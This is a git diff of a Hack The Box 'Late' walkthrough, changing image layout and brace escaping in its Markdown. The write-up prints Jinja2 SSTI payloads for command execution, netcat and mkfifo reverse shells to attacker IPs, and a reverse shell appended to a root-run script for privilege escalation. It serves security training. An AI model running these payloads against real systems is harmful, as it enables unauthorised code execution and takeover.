@@ -46,7 +46,9 @@ On the nmap we cannot see too much but two ports open, an SSH server and the por
 - Nginx 1.14.0
 - Jquery 1.10.2
 
-<img src="/images/walkthroughs/hackthebox/late/1_0_web.png" width="90%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/1_0_web.png" width="90%"/>
+</p>
 
 At the bottom of the page we can see the following link:
 
@@ -54,11 +56,15 @@ http://images.late.htb/
 
 We add the hostname into the /etc/hosts file and using that URL, we reach the tool, which is implemented in Flask (Python) as indicated in the title:
 
-<img src="/images/walkthroughs/hackthebox/late/2_0_images.png" width="90%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/2_0_images.png" width="90%"/>
+</p>
 
 I used the following image to see what the server is doing with the OCR output:
 
-<img src="/images/walkthroughs/hackthebox/late/test.png" width="30%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/test.png" width="30%"/>
+</p>
 
 Output:
 
@@ -73,8 +79,9 @@ Well... The OCR is not that great. But we can see that the output goes into an H
 Error occured while processing the image: cannot identify image file '/home/svc_acc/app/uploads/test.png622'
 ```
 
-<img src="/images/walkthroughs/hackthebox/late/3_0_upload_bypass.png" width="90%"/>
-
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/3_0_upload_bypass.png" width="90%"/>
+</p>
 
 Furthermore, there is a filter, since the '//' turns into '\_' when displayed in the error:
 
@@ -82,16 +89,18 @@ Furthermore, there is a filter, since the '//' turns into '\_' when displayed in
 /home/svc_acc/app/uploads/test1234.png_.._.._asdf.png9970
 ```
 
-<img src="/images/walkthroughs/hackthebox/late/3_1_filters.png" width="90%"/>
-
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/3_1_filters.png" width="90%"/>
+</p>
 
 I stopped trying any kind of XXE or file upload vulnerabilities. Then I noticed the "Convert image to text **with Flask**" so I first thing I try on Python web apps are SSTI payloads.
 
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/test_ssti.png" width="20%"/>
+</p>
 
-<img src="/images/walkthroughs/hackthebox/late/test_ssti.png" width="30%"/>
-
-```
-{{7*7}}
+```python
+{ {7*7} }
 ```
 
 Output:
@@ -105,25 +114,27 @@ Se we have spotted an SSTI vulnerability, it seems like it's rendering the OCR o
 
 We are going hard with this payload:
 
-```
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+```python
+{ { ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() } }
 ```
 
-<img src="/images/walkthroughs/hackthebox/late/test_3.png" width="90%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/test_3.png" width="90%"/>
+</p>
 
 And that was the output on the web browser:
 
 ```
 Error occured while processing the image: 'str object' has no attribute 'class'
 ```
-
-<img src="/images/walkthroughs/hackthebox/late/3_2_error.png" width="90%"/>
-
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/3_2_error.png" width="70%"/>
+</p>
 
 There was many tries and payloads...
 
 ```
-{{''.class.mro()[1].subclasses()}}
+{ {''.class.mro()[1].subclasses()} }
 
 
 {{ "".class.mro()[1].subclasses()}}
@@ -173,6 +184,7 @@ There was many tries and payloads...
 
 ```
 
+I tried to get some extra information with working paylaods:
 
 ```
 {{ config }}
@@ -182,30 +194,32 @@ There was many tries and payloads...
 ```
 
 
-After so many tries with different letter styles, backgrounds, font size and using spaces so the algorithm can differenciate correctly the characters I got command execution:
+And after so many tries with different letter styles, backgrounds, font size and using spaces so the OCR algorithm can differenciate correctly the characters I got command execution:
 
 ```python
-{{ cycler.__init__.__globals__.os.popen(' id ').read() }}
+{ { cycler.__init__.__globals__.os.popen(' id ').read() } }
 ```
 
-<img src="/images/walkthroughs/hackthebox/late/4_0_id.png" width="90%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/4_0_id.png" width="90%"/>
+</p>
 
 Output:
 
 ```
 <p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
-
 </p>
 ```
 
 Then I started collecting some information from the environment before trying to spawn a revshell:
 
 ls:
-
-<img src="/images/walkthroughs/hackthebox/late/4_1_ls.png" width="90%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/4_1_ls.png" width="90%"/>
+</p>
 
 ```python
-{{ cycler.__init__.__globals__.os.popen(' ls ').read() }}
+{ { cycler.__init__.__globals__.os.popen(' ls ').read() } }
 ```
 
 Output:
@@ -218,16 +232,17 @@ static
 templates
 uploads
 wsgi.py
-
 </p>
 ```
 
 Netcat:
 
-<img src="/images/walkthroughs/hackthebox/late/4_2_nc.png" width="90%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/4_2_nc.png" width="90%"/>
+</p>
 
 ```python
-{{ cycler.__init__.__globals__.os.popen(' nc 10.10.14.58 4444 -e /bin/bash ').read() }}
+{ { cycler.__init__.__globals__.os.popen(' nc 10.10.14.58 4444 -e /bin/bash ').read() } }
 ```
 
 Output:
@@ -235,11 +250,12 @@ Output:
 ```
 Error occured while processing the image: 'type object' has no attribute 'init__'
 ```
-
-<img src="/images/walkthroughs/hackthebox/late/4_3_wget2.png" width="90%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/4_3_wget2.png" width="90%"/>
+</p>
 
 ```python
-{{ cycler.__init__.__globals__.os.popen(" wget http://10.10.14.58:5453 ").read() }}
+{ { cycler.__init__.__globals__.os.popen(" wget http://10.10.14.58:5453 ").read() } }
 ```
 
 It was success and get a request.
@@ -247,7 +263,7 @@ It was success and get a request.
 Tried to get as much information as possible while trying to get a reverse shell...
 
 ```python
-{{ cycler.__init__.__globals__.os.popen(' cat main.py ').read() }}
+{ { cycler.__init__.__globals__.os.popen(' cat main.py ').read() } }
 ```
 
 main.py
@@ -298,21 +314,29 @@ def scan_file():
     return 'Invalid Extension'
 ```
 
-<img src="/images/walkthroughs/hackthebox/late/4_3_wget2.png" width="90%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/4_3_wget2.png" width="90%"/>
+</p>
 
 And the final payload to get the reverse shell:
 
 ```python
-{{ cycler.__init__.__globals__.os.popen(" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.192 4444 >/tmp/f ").read() }}
+{ { cycler.__init__.__globals__.os.popen(" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.192 4444 >/tmp/f ").read() } }
 ```
-<img src="/images/walkthroughs/hackthebox/late/4_4_rev.png" width="90%"/>
+
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/4_4_rev.png" width="90%"/>
+</p>
 
 And it worked:
 
-<img src="/images/walkthroughs/hackthebox/late/5_0_user.png" width="70%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/5_0_user.png" width="70%"/>
+</p>
 
-<img src="/images/walkthroughs/hackthebox/late/5_1_user.png" width="70%"/>
-
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/5_1_user.png" width="70%"/>
+</p>
 
 ``` 2870e52b45c1cb066bda6a1828c5ebee ```
 
@@ -326,7 +350,9 @@ CMD: UID=0    PID=2227   | /bin/bash /usr/local/sbin/ssh-alert.sh
 CMD: UID=0    PID=2323   | chattr +a /usr/local/sbin/ssh-alert.sh 
 ```
 
-<img src="/images/walkthroughs/hackthebox/late/6_0_pspy64.png" width="70%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/6_0_pspy64.png" width="70%"/>
+</p>
 
 That script is owned by us, therefore, an edit with a rev shell at the end should do the job:
 
@@ -358,11 +384,15 @@ mkfifo /tmp/f; nc 10.10.14.3 5455 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 
 When saving in nano it shows _[ Error writing /usr/local/sbin/ssh-alert.sh: Operation not permitted ]_
 
-<img src="/images/walkthroughs/hackthebox/late/6_1_not_write.png" width="90%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/6_1_not_write.png" width="90%"/>
+</p>
 
 Checking the other attributes, we can see that we have append permission, so lets append to the file:
 
-<img src="/images/walkthroughs/hackthebox/late/6_2_apped.png" width="60%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/6_2_apped.png" width="60%"/>
+</p>
 
 ```bash
 echo "mkfifo /tmp/f; nc 10.10.14.3 5455 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f" >> /usr/local/sbin/ssh-alert.sh
@@ -370,6 +400,8 @@ echo "mkfifo /tmp/f; nc 10.10.14.3 5455 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp
 
 We iniciate a SSH into svc_acc user and we get the shell in our host.
 
-<img src="/images/walkthroughs/hackthebox/late/7_0_root.png" width="90%"/>
+<p align="center">
+  <img src="/images/walkthroughs/hackthebox/late/7_0_root.png" width="90%"/>
+</p>
 
 ``` 7aa38494fb2a4439e9f2b73c055e00d1 ```
